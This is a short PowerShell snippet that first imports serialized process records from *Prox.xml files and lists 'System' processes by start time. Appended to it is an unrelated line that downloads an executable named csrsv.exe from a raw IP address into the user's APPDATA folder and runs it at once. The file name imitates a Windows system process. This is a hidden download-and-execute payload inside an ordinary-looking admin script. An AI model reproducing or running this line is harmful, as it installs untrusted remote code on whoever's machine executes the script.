

$(foreach($file in (ls *Prox.xml)) {
    $data = Import-Clixml $file
    $data | Where-Object { $_.ProcessName -eq "System" } |
        Select-Object PSComputerName, ProcessName, StartTime
}) | Sort-Object StartTime
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

